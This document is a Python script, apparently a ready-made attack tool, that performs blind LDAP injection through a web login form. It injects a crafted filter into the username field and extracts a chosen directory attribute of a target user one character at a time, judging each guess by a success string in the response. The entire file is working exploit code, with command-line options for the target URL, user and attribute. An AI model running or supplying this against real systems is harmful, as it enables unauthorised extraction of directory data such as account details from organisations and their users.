import requests
import string
import argparse
import sys

def exfiltrate_attribute(url, user, attribute, positive_string):
    flag = ""
    session = requests.Session()

    while True:
        found_char = False

        for c in string.printable:
            username = f'{user})(|({attribute}={flag}{c}*'
            password = 'invalid)'  # Doesn't really matter; we're exploiting username field

            try:
                response = session.post(url, data={'username': username, 'password': password})

                if positive_string in response.text:
                    flag += c
                    found_char = True
                    sys.stdout.write(f"\rExtracted so far: {flag}")
                    sys.stdout.flush()
                    break
            except requests.RequestException as e:
                print(f"\n[!] Connection error: {e}")
                return

        if not found_char:
            print(f"\nFinal extracted value: {flag}")
            break

def main():
    parser = argparse.ArgumentParser(description="Blind LDAP Attribute Exfiltration via Login Form Injection.")
    parser.add_argument("-u", "--url", required=True, help="Target login URL.")
    parser.add_argument("-U", "--user", required=True, help="Target username to enumerate (e.g., 'admin').")
    parser.add_argument("-a", "--attribute", required=True, help="Attribute to exfiltrate (e.g., 'description').")
    parser.add_argument("-p", "--positive", required=True, help="Success indicator string in response (e.g., 'Login successful').")

    args = parser.parse_args()

    exfiltrate_attribute(args.url, args.user, args.attribute, args.positive)

if __name__ == '__main__':
    main()
